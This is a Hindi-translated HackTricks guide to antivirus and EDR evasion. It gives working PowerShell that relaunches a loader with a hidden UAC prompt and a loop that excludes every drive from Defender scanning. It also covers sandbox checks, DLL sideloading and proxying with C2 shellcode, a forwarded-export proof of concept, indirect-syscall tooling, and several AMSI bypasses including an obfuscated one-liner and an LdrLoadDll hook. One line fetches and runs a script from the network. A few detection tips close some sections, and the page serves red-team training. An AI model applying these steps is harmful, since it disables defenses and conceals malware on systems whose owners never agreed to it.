# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पेज शुरू में** [**@m2rc_p**](https://twitter.com/m2rc_p) **द्वारा लिखा गया था!**

## Defender को रोकें

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने वाला एक tool।
- [no-defender](https://github.com/es3n1n/no-defender): किसी अन्य AV का दिखावा करके Windows Defender को काम करने से रोकने वाला एक tool।
- [यदि आप admin हैं तो Defender को Disable करें](basic-powershell-for-pentesters/README.md)

### Defender के साथ छेड़छाड़ करने से पहले Installer-style UAC bait

Game cheats का रूप धारण करने वाले Public loaders अक्सर unsigned Node.js/Nexe installers के रूप में आते हैं, जो पहले **user से elevation के लिए पूछते हैं** और उसके बाद ही Defender को निष्क्रिय करते हैं। Flow सरल है:

1. `net session` के साथ administrative context की जाँच करें। यह command तभी सफल होता है जब caller के पास admin rights हों, इसलिए failure का अर्थ है कि loader standard user के रूप में चल रहा है।
2. Original command line को सुरक्षित रखते हुए, अपेक्षित UAC consent prompt को trigger करने के लिए स्वयं को `RunAs` verb के साथ तुरंत relaunch करें।
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Victims पहले से ही मानते हैं कि वे “cracked” software install कर रहे हैं, इसलिए prompt आमतौर पर स्वीकार कर लिया जाता है, जिससे malware को Defender की policy बदलने के लिए आवश्यक अधिकार मिल जाते हैं।

### हर drive letter के लिए blanket `MpPreference` exclusions

एक बार elevated होने के बाद, GachiLoader-style chains service को पूरी तरह disable करने के बजाय Defender के blind spots को अधिकतम करती हैं। Loader पहले GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) को समाप्त करता है और फिर **बेहद व्यापक exclusions** लागू करता है, ताकि हर user profile, system directory और removable disk scanning से बाहर हो जाए:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
मुख्य अवलोकन:

- यह loop हर mounted filesystem (D:\, E:\, USB sticks आदि) पर चलता है, इसलिए **disk पर कहीं भी भविष्य में drop किया गया कोई भी payload अनदेखा किया जाता है**।
- `.sys` extension exclusion forward-looking है—attackers बाद में Defender को दोबारा छुए बिना unsigned drivers load करने का विकल्प सुरक्षित रखते हैं।
- सभी बदलाव `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` के अंतर्गत होते हैं, जिससे बाद के stages exclusions के persist होने की पुष्टि कर सकते हैं या UAC को दोबारा trigger किए बिना उन्हें expand कर सकते हैं।

क्योंकि कोई Defender service stop नहीं की जाती, naïve health checks “antivirus active” report करते रहते हैं, जबकि real-time inspection वास्तव में उन paths को कभी scan नहीं करती।

## **AV Evasion Methodology**

वर्तमान में, AVs यह जांचने के लिए अलग-अलग methods का उपयोग करते हैं कि कोई file malicious है या नहीं: static detection, dynamic analysis और अधिक advanced EDRs के लिए behavioural analysis।

### **Static detection**

Static detection किसी binary या script में ज्ञात malicious strings या bytes के arrays को flag करके, और file से ही information extract करके (जैसे file description, company name, digital signatures, icon, checksum आदि) की जाती है। इसका अर्थ है कि ज्ञात public tools का उपयोग करने पर आपके caught होने की संभावना अधिक हो सकती है, क्योंकि उनका शायद पहले ही analysis करके उन्हें malicious के रूप में flag किया जा चुका है। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

यदि आप binary को encrypt करते हैं, तो AV के पास आपके program को detect करने का कोई तरीका नहीं होगा, लेकिन आपको memory में program को decrypt और run करने के लिए किसी प्रकार के loader की आवश्यकता होगी।

- **Obfuscation**

कभी-कभी AV से बचाने के लिए आपको केवल अपने binary या script में कुछ strings बदलनी होती हैं, लेकिन आप क्या obfuscate करने का प्रयास कर रहे हैं, इसके आधार पर यह समय लेने वाला काम हो सकता है।

- **Custom tooling**

यदि आप अपने tools खुद develop करते हैं, तो कोई ज्ञात bad signatures नहीं होंगे, लेकिन इसमें काफी समय और प्रयास लगता है।

> [!TIP]
> Windows Defender static detection के विरुद्ध check करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह मूल रूप से file को कई segments में split करता है और फिर Defender को प्रत्येक segment को individually scan करने के लिए कहता है। इस तरह यह आपको ठीक-ठीक बता सकता है कि आपके binary में कौन-सी strings या bytes flagged हैं।

मैं आपको practical AV Evasion के बारे में इस [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) को देखने की अत्यधिक सलाह देता हूं।

### **Dynamic analysis**

Dynamic analysis तब होती है जब AV आपके binary को sandbox में run करता है और malicious activity पर नजर रखता है (जैसे आपके browser के passwords को decrypt और read करने का प्रयास करना, LSASS पर minidump करना आदि)। इस भाग के साथ काम करना थोड़ा अधिक कठिन हो सकता है, लेकिन sandboxes से बचने के लिए आप ये कुछ काम कर सकते हैं।

- **Sleep before execution** इसके implementation के आधार पर, यह AV की dynamic analysis को bypass करने का एक शानदार तरीका हो सकता है। AVs के पास files को scan करने के लिए बहुत कम समय होता है, ताकि user का workflow interrupt न हो, इसलिए लंबे sleeps का उपयोग binaries के analysis में बाधा डाल सकता है। समस्या यह है कि कई AVs के sandboxes implementation के आधार पर sleep को skip कर सकते हैं।
- **Checking machine's resources** आमतौर पर Sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (जैसे < 2GB RAM), अन्यथा वे user की machine को slow कर सकते हैं। यहां आप बहुत creative भी हो सकते हैं, उदाहरण के लिए CPU का temperature या यहां तक कि fan speeds check करके; sandbox में हर चीज implemented नहीं होगी।
- **Machine-specific checks** यदि आप ऐसे user को target करना चाहते हैं जिसकी workstation `"contoso.local"` domain से joined है, तो आप computer के domain को check करके देख सकते हैं कि वह आपके specified domain से match करता है या नहीं। यदि match न करे, तो आप अपने program को exit करा सकते हैं।

पता चला है कि Microsoft Defender's Sandbox का computername `HAL9TH` है। इसलिए detonation से पहले आप अपने malware में computer name check कर सकते हैं। यदि name `HAL9TH` से match करता है, तो इसका अर्थ है कि आप Defender's sandbox के अंदर हैं, इसलिए आप अपने program को exit करा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के विरुद्ध काम करने के लिए [@mgeeky](https://twitter.com/mariuszbit) के कुछ अन्य बहुत अच्छे tips

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस post में पहले कहा है, **public tools** अंततः **detect हो जाएंगे**, इसलिए आपको खुद से एक सवाल पूछना चाहिए:

उदाहरण के लिए, यदि आप LSASS dump करना चाहते हैं, तो **क्या आपको वास्तव में mimikatz का उपयोग करने की आवश्यकता है**? या क्या आप किसी ऐसे अलग project का उपयोग कर सकते हैं जो कम प्रसिद्ध हो और LSASS को dump भी करता हो?

सही उत्तर संभवतः दूसरा विकल्प है। mimikatz को उदाहरण के रूप में लें: यह संभवतः AVs और EDRs द्वारा सबसे अधिक flagged malware में से एक है। हालांकि project स्वयं बहुत शानदार है, लेकिन AVs से बचने के लिए इसके साथ काम करना एक nightmare भी है। इसलिए आप जो achieve करना चाहते हैं, उसके लिए alternatives खोजें।

> [!TIP]
> Evasion के लिए अपने payloads को modify करते समय, Defender में **automatic sample submission बंद** करना सुनिश्चित करें, और कृपया, गंभीरता से, यदि आपका लक्ष्य लंबे समय तक evasion हासिल करना है तो **VIRUSTOTAL पर UPLOAD न करें**। यदि आप check करना चाहते हैं कि आपका payload किसी particular AV द्वारा detect होता है या नहीं, तो उसे VM पर install करें, automatic sample submission बंद करने का प्रयास करें और वहां तब तक test करें जब तक आप result से संतुष्ट न हों।

## EXEs vs DLLs

जब भी संभव हो, evasion के लिए हमेशा **DLLs का उपयोग प्राथमिकता से करें**। मेरे अनुभव में, DLL files आमतौर पर **काफी कम detect और analyze** की जाती हैं, इसलिए कुछ मामलों में detection से बचने के लिए यह एक बहुत simple trick है (यदि आपके payload को DLL के रूप में run करने का कोई तरीका हो, तो निश्चित रूप से)।

जैसा कि हम इस image में देख सकते हैं, Havoc के एक DLL Payload की antiscan.me में detection rate 4/26 है, जबकि EXE payload की detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me पर एक normal Havoc EXE payload और एक normal Havoc DLL की तुलना</p></figcaption></figure>

अब हम कुछ ऐसी tricks दिखाएंगे जिनका उपयोग आप DLL files के साथ उन्हें अधिक stealthy बनाने के लिए कर सकते हैं।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा उपयोग किए जाने वाले DLL search order का लाभ उठाता है और victim application तथा malicious payload(s) दोनों को एक-दूसरे के साथ position करता है।

आप [Siofra](https://github.com/Cybereason/siofra) और निम्नलिखित powershell script का उपयोग करके DLL Sideloading के प्रति susceptible programs की जांच कर सकते हैं:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
यह command "C:\Program Files\\" के अंदर DLL hijacking के प्रति susceptible programs और उन DLL files की list output करेगा जिन्हें वे load करने का प्रयास करते हैं।

मैं अत्यधिक recommend करता हूं कि आप **DLL Hijackable/Sideloadable programs** को स्वयं **explore** करें। सही तरीके से की गई यह technique काफी stealthy होती है, लेकिन यदि आप publicly known DLL Sideloadable programs का उपयोग करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

किसी program द्वारा load किए जाने की अपेक्षा वाली name के साथ केवल एक malicious DLL रखने से आपका payload load नहीं होगा, क्योंकि program उस DLL के अंदर कुछ specific functions की अपेक्षा करता है। इस समस्या को ठीक करने के लिए, हम **DLL Proxying/Forwarding** नामक एक अन्य technique का उपयोग करेंगे।

**DLL Proxying** program द्वारा की जाने वाली calls को proxy (और malicious) DLL से original DLL तक forward करता है, जिससे program की functionality बनी रहती है और आपके payload के execution को handle करना संभव होता है।

मैं [@flangvik](https://twitter.com/Flangvik) के [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project का उपयोग करूंगा।

मैंने ये steps follow किए:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
अंतिम command हमें 2 files देगा: एक DLL source code template और मूल नाम बदली गई DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
ये परिणाम हैं:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे shellcode (जिसे [SGN](https://github.com/EgeBalci/sgn) से encoded किया गया है) और proxy DLL, दोनों की [antiscan.me](https://antiscan.me) में 0/26 Detection rate है! मैं इसे सफल कहूंगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं आपको **दृढ़ता से recommend** करता हूं कि DLL Sideloading के बारे में [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) और [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) जरूर देखें, ताकि हमने जिस विषय पर चर्चा की है उसे अधिक गहराई से समझ सकें।

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules ऐसी functions export कर सकते हैं जो वास्तव में "forwarders" होती हैं: code की ओर point करने के बजाय, export entry में `TargetDll.TargetFunc` के रूप में एक ASCII string होती है। जब कोई caller export को resolve करता है, तो Windows loader:

- यदि `TargetDll` पहले से loaded नहीं है, तो उसे load करता है
- उसमें से `TargetFunc` को resolve करता है

समझने योग्य मुख्य behaviors:
- यदि `TargetDll` एक KnownDLL है, तो उसे protected KnownDLLs namespace (जैसे ntdll, kernelbase, ole32) से supplied किया जाता है।
- यदि `TargetDll` KnownDLL नहीं है, तो normal DLL search order का उपयोग किया जाता है, जिसमें उस module की directory भी शामिल होती है जो forward resolution कर रहा है।

यह एक indirect sideloading primitive को सक्षम बनाता है: ऐसी signed DLL खोजें जो किसी non-KnownDLL module name को forwarded function के रूप में export करती हो, फिर उस signed DLL को attacker-controlled DLL के साथ co-locate करें, जिसका नाम forwarded target module के बिल्कुल समान हो। जब forwarded export invoke किया जाता है, तो loader forward को resolve करता है और उसी directory से आपकी DLL load करता है, जिससे आपका `DllMain` execute होता है।

Windows 11 पर देखा गया उदाहरण:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` एक KnownDLL नहीं है, इसलिए इसे सामान्य search order के माध्यम से resolve किया जाता है।

PoC (copy-paste):
1) Signed system DLL को writable folder में copy करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी folder में एक malicious `NCRYPTPROV.dll` रखें। Code execution प्राप्त करने के लिए एक minimal DllMain पर्याप्त है; DllMain को trigger करने के लिए आपको forwarded function implement करने की आवश्यकता नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) signed LOLBin के साथ forward trigger करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) को load करता है
- `KeyIsoSetAuditingInterface` को resolve करते समय, loader forward को `NCRYPTPROV.SetAuditingInterface` तक follow करता है
- इसके बाद loader `C:\test` से `NCRYPTPROV.dll` को load करता है और उसका `DllMain` execute करता है
- यदि `SetAuditingInterface` implement नहीं किया गया है, तो "missing API" error केवल `DllMain` के पहले ही run हो जाने के बाद मिलेगा

Hunting tips:
- उन forwarded exports पर ध्यान दें जिनका target module KnownDLL नहीं है। KnownDLLs को `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के अंतर्गत सूचीबद्ध किया गया है।
- आप निम्न जैसे tooling से forwarded exports enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Candidates खोजने के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- ऐसे LOLBins (जैसे, `rundll32.exe`) की निगरानी करें जो non-system paths से signed DLLs load करते हैं, और उसके बाद उसी directory से समान base name वाले non-KnownDLLs load करते हैं
- इन process/module chains पर alert करें: `rundll32.exe` → user-writable paths के अंतर्गत non-system `keyiso.dll` → `NCRYPTPROV.dll`
- Code integrity policies (WDAC/AppLocker) लागू करें और application directories में write+execute को deny करें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze suspended processes, direct syscalls, और alternative execution methods का उपयोग करके EDRs को bypass करने वाला payload toolkit है`

आप Freeze का उपयोग अपने shellcode को stealthy तरीके से load और execute करने के लिए कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion केवल cat & mouse game है; जो आज काम करता है, वह कल detect हो सकता है, इसलिए कभी भी केवल एक tool पर निर्भर न रहें। यदि संभव हो, तो कई evasion techniques को chain करने का प्रयास करें।

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs अक्सर `ntdll.dll` के syscall stubs पर **user-mode inline hooks** लगाते हैं। इन hooks को bypass करने के लिए, आप **direct** या **indirect** syscall stubs generate कर सकते हैं, जो सही **SSN** (System Service Number) लोड करते हैं और hooked export entrypoint को execute किए बिना kernel mode में transition करते हैं।

**Invocation options:**
- **Direct (embedded)**: generated stub में `syscall`/`sysenter`/`SVC #0` instruction emit करता है (`ntdll` export hit नहीं होता)।
- **Indirect**: `ntdll` के अंदर मौजूद `syscall` gadget में jump करता है, ताकि kernel transition `ntdll` से originate होता हुआ दिखाई दे (heuristic evasion के लिए उपयोगी); **randomized indirect** हर call के लिए एक pool से gadget चुनता है।
- **Egg-hunt**: disk पर static `0F 05` opcode sequence embed करने से बचता है; runtime पर syscall sequence resolve करता है।

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes को पढ़ने के बजाय syscall stubs को virtual address के आधार पर sort करके SSNs infer करता है।
- **SyscallsFromDisk**: एक clean `\KnownDlls\ntdll.dll` map करता है, उसके `.text` से SSNs पढ़ता है, फिर उसे unmap करता है (सभी in-memory hooks को bypass करता है)।
- **RecycledGate**: VA-sorted SSN inference को opcode validation के साथ combine करता है, जब कोई stub clean हो; यदि hooked हो, तो VA inference पर fallback करता है।
- **HW Breakpoint**: `syscall` instruction पर DR0 set करता है और runtime पर `EAX` से SSN capture करने के लिए VEH का उपयोग करता है, hooked bytes को parse किए बिना।

SysWhispers4 usage का उदाहरण:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" को रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल **disk पर मौजूद files** को scan करने में सक्षम थे, इसलिए यदि आप किसी तरह payloads को **सीधे memory में** execute कर सकते थे, तो AV इसे रोकने के लिए कुछ नहीं कर सकता था, क्योंकि उसके पास पर्याप्त visibility नहीं थी।

AMSI feature Windows के इन components में integrated है।

- User Account Control, या UAC (EXE, COM, MSI, या ActiveX installation का elevation)
- PowerShell (scripts, interactive use, और dynamic code evaluation)
- Windows Script Host (wscript.exe और cscript.exe)
- JavaScript और VBScript
- Office VBA macros

यह antivirus solutions को script contents को ऐसे form में expose करके script behavior inspect करने की अनुमति देता है, जो unencrypted और unobfuscated दोनों होता है।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` को run करने पर Windows Defender में निम्न alert दिखाई देगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` और उसके बाद उस executable का path जोड़ता है जिससे script run हुई थी; इस मामले में, powershell.exe

हमने disk पर कोई file नहीं डाली, फिर भी AMSI के कारण memory में ही पकड़े गए।

इसके अलावा, **.NET 4.8** से शुरू होकर, C# code भी AMSI के माध्यम से run किया जाता है। इसका प्रभाव `Assembly.Load(byte[])` पर भी पड़ता है, जिसका उपयोग in-memory execution को load करने के लिए किया जाता है। इसलिए यदि आप AMSI से evade करना चाहते हैं, तो in-memory execution के लिए .NET के lower versions (जैसे 4.7.2 या उससे नीचे) का उपयोग recommended है।

AMSI से बचने के कुछ तरीके हैं:

- **Obfuscation**

चूंकि AMSI मुख्य रूप से static detections के साथ काम करता है, इसलिए जिन scripts को आप load करने का प्रयास करते हैं, उन्हें modify करना detection से evade करने का एक अच्छा तरीका हो सकता है।

हालांकि, AMSI में scripts की कई layers होने पर भी उन्हें unobfuscate करने की capability होती है, इसलिए obfuscation, इसे किए जाने के तरीके के आधार पर, एक खराब option हो सकता है। इससे evade करना बहुत straightforward नहीं रहता। हालांकि, कभी-कभी आपको केवल कुछ variable names बदलने होते हैं और काम हो जाता है, इसलिए यह इस बात पर निर्भर करता है कि किसी चीज़ को कितनी हद तक flag किया गया है।

- **AMSI Bypass**

चूंकि AMSI को powershell (और cscript.exe, wscript.exe आदि) process में एक DLL load करके implement किया जाता है, इसलिए unprivileged user के रूप में run करते हुए भी इसके साथ आसानी से tamper करना संभव है। AMSI के implementation में मौजूद इस flaw के कारण, researchers ने AMSI scanning से evade करने के कई तरीके खोजे हैं।

**Forcing an Error**

AMSI initialization को fail करने के लिए force करने (`amsiInitFailed`) पर current process के लिए कोई scan initiate नहीं किया जाएगा। मूल रूप से इसे [Matt Graeber](https://twitter.com/mattifestation) ने disclose किया था और Microsoft ने इसके व्यापक उपयोग को रोकने के लिए एक signature विकसित की है।
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
वर्तमान powershell process के लिए AMSI को unusable बनाने में powershell code की केवल एक line लगी। बेशक, इस line को स्वयं AMSI ने flag कर दिया है, इसलिए इस technique का उपयोग करने के लिए कुछ modification आवश्यक है।

यह modified AMSI bypass मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
ध्यान रखें कि यह post प्रकाशित होने के बाद संभवतः flag हो जाएगा, इसलिए यदि आपकी योजना undetected रहना है, तो कोई भी code publish नहीं करना चाहिए।

**Memory Patching**

इस technique को सबसे पहले [@RastaMouse](https://twitter.com/_RastaMouse/) ने खोजा था। इसमें amsi.dll में मौजूद "AmsiScanBuffer" function का address ढूँढना (जो user-supplied input को scan करने के लिए जिम्मेदार है) और उसे ऐसे instructions से overwrite करना शामिल है, जो E_INVALIDARG का code return करें। इस तरह, actual scan का result 0 return होगा, जिसे clean result के रूप में interpret किया जाता है।

> [!TIP]
> अधिक विस्तृत explanation के लिए कृपया [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

powershell के साथ AMSI को bypass करने के लिए कई अन्य techniques भी उपयोग की जाती हैं। इनके बारे में अधिक जानने के लिए [**इस page**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**इस repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) को देखें।

### amsi.dll load को रोककर AMSI को block करना (LdrLoadDll hook)

AMSI केवल तब initialise होता है जब `amsi.dll` current process में load हो जाती है। एक robust, language-agnostic bypass यह है कि `ntdll!LdrLoadDll` पर user-mode hook लगाया जाए, जो requested module `amsi.dll` होने पर error return करे। इसके परिणामस्वरूप, AMSI कभी load नहीं होता और उस process के लिए कोई scan नहीं होता।

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
नोट्स
- PowerShell, WScript/CScript और custom loaders सभी में काम करता है (ऐसी किसी भी चीज़ में जो अन्यथा AMSI load करती)।
- scripts को stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) के माध्यम से feed करने के साथ उपयोग करें, ताकि लंबे command-line artefacts से बचा जा सके।
- LOLBins के माध्यम से executed loaders में उपयोग किया हुआ देखा गया है (जैसे, `regsvr32` द्वारा `DllRegisterServer` को call करना)।

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** tool भी AMSI को bypass करने के लिए script generate करता है।
**[https://amsibypass.com/](https://amsibypass.com/)** tool भी AMSI को bypass करने के लिए script generate करता है, जो randomized user-defined function, variables, characters expression का उपयोग करके और PowerShell keywords पर random character casing लागू करके signature से बचता है।

**पता लगाए गए signature को हटाएं**

आप **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे tool का उपयोग करके current process की memory से detected AMSI signature को हटा सकते हैं। यह tool current process की memory को AMSI signature के लिए scan करके और फिर उसे NOP instructions से overwrite करके काम करता है, जिससे वह memory से प्रभावी रूप से हट जाता है।

**AMSI का उपयोग करने वाले AV/EDR products**

AMSI का उपयोग करने वाले AV/EDR products की सूची **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** में मिल सकती है।

**PowerShell version 2 का उपयोग करें**
यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा scan किए बिना चला सकते हैं। आप यह कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging एक ऐसी सुविधा है जो system पर execute किए गए सभी PowerShell commands को log करने की अनुमति देती है। यह auditing और troubleshooting के लिए उपयोगी हो सकती है, लेकिन यह **detection से बचना चाहने वाले attackers के लिए समस्या** भी बन सकती है।

PowerShell logging को bypass करने के लिए आप निम्नलिखित techniques का उपयोग कर सकते हैं:

- **Disable PowerShell Transcription and Module Logging**: इसके लिए आप [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे tool का उपयोग कर सकते हैं।
- **Use Powershell version 2**: यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा scan किए बिना चला सकते हैं। आप यह कर सकते हैं: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: बिना defenses के powershell spawn करने के लिए [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का उपयोग करें (यही Cobal Strike का `powerpick` उपयोग करता है)।


## Obfuscation

> [!TIP]
> कई obfuscation techniques data को encrypt करने पर निर्भर करती हैं, जिससे binary की entropy बढ़ जाएगी और AVs तथा EDRs के लिए इसका detection आसान हो जाएगा। इसके साथ सावधान रहें और संभव हो तो encryption को अपने code के केवल उन specific sections पर लागू करें जो sensitive हैं या जिन्हें hidden रखना आवश्यक है।

### ConfuserEx-Protected .NET Binaries को Deobfuscate करना

ConfuserEx 2 (या commercial forks) का उपयोग करने वाले malware का analysis करते समय protection की कई layers का सामना करना सामान्य है, जो decompilers और sandboxes को block कर देती हैं। नीचे दिया गया workflow विश्वसनीय रूप से **near-original IL को restore** करता है, जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।

1. Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है, इसलिए कोई भी modification binary को crash कर देगा। Encrypted metadata tables को locate करने, XOR keys recover करने और एक clean assembly rewrite करने के लिए **AntiTamperKiller** का उपयोग करें:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होते हैं, जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* file को **de4dot-cex** (de4dot का ConfuserEx-aware fork) में feed करें।
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile select करता है
• de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names को restore करेगा तथा constant strings को decrypt करेगा।

